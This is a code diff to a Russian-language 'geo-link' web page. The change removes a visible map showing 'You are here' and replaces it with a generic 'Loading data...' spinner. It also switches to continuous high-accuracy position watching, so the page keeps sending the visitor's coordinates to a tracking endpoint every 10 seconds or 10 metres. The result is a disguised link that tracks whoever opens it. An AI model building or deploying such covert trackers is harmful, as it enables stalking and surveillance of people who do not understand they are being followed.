@@ -5,15 +5,45 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Гео-ссылка</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
-    #map { width: 100vw; height: 60vh; }
-    #status { margin: 20px; font-size: 1.2em; }
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f7f7f7; }
+    .center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 30px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .success {
+      color: #27ae60;
+      font-size: 60px;
+      margin-bottom: 20px;
+      animation: pop 0.3s;
+    }
+    @keyframes pop {
+      0% { transform: scale(0.5); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    #status { font-size: 1.3em; text-align: center; }
   </style>
-  <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
 </head>
 <body>
-  <div id="status">Запрашиваем геолокацию...</div>
-  <div id="map"></div>
+  <div class="center" id="main">
+    <div class="loader" id="loader"></div>
+    <div id="status">Загрузка данных...</div>
+  </div>
   <script>
     function getIdFromPath() {
       const parts = window.location.pathname.split('/');
@@ -21,6 +51,9 @@
     }
     function showStatus(msg) {
       document.getElementById('status').textContent = msg;
+    }
+    function showSuccess() {
+      document.getElementById('main').innerHTML = '<div class="success">&#10004;</div><div id="status">Данные успешно отправлены!</div>';
     }
     function sendCoords(id, lat, lon) {
       fetch(`/api/track/${id}`, {
@@ -30,35 +63,50 @@
       })
       .then(r => r.json())
       .then(data => {
-        if (data.ok) showStatus('Координаты успешно отправлены!');
+        if (data.ok) showSuccess();
         else showStatus('Ошибка отправки: ' + (data.error || 'Неизвестно'));
       })
       .catch(() => showStatus('Ошибка соединения с сервером.'));
     }
-    function showMap(lat, lon) {
-      ymaps.ready(function () {
-        var map = new ymaps.Map('map', {
-          center: [lat, lon],
-          zoom: 16
-        });
-        map.geoObjects.add(new ymaps.Placemark([lat, lon], {
-          balloonContent: 'Вы здесь!'
-        }));
-      });
+    let lastLat = null;
+    let lastLon = null;
+    let lastSent = 0;
+    function distance(lat1, lon1, lat2, lon2) {
+      const R = 6371000;
+      const toRad = x => x * Math.PI / 180;
+      const dLat = toRad(lat2 - lat1);
+      const dLon = toRad(lon2 - lon1);
+      const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
+                Math.sin(dLon/2) * Math.sin(dLon/2);
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+      return R * c;
     }
-    // Запрос геолокации
+    function shouldSend(lat, lon) {
+      const now = Date.now();
+      if (lastLat === null || lastLon === null) return true;
+      if (distance(lat, lon, lastLat, lastLon) > 10) return true;
+      if (now - lastSent > 10000) return true;
+      return false;
+    }
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(pos) {
+      navigator.geolocation.watchPosition(function(pos) {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
-        showStatus('Координаты получены, отправляем...');
-        showMap(lat, lon);
-        sendCoords(getIdFromPath(), lat, lon);
+        if (shouldSend(lat, lon)) {
+          lastLat = lat;
+          lastLon = lon;
+          lastSent = Date.now();
+          showStatus('Загрузка данных...');
+          sendCoords(getIdFromPath(), lat, lon);
+        }
       }, function(err) {
         showStatus('Не удалось получить геолокацию: ' + err.message);
-      });
+        document.getElementById('loader').style.display = 'none';
+      }, { enableHighAccuracy: true });
     } else {
       showStatus('Ваш браузер не поддерживает геолокацию.');
+      document.getElementById('loader').style.display = 'none';
     }
   </script>
 </body>
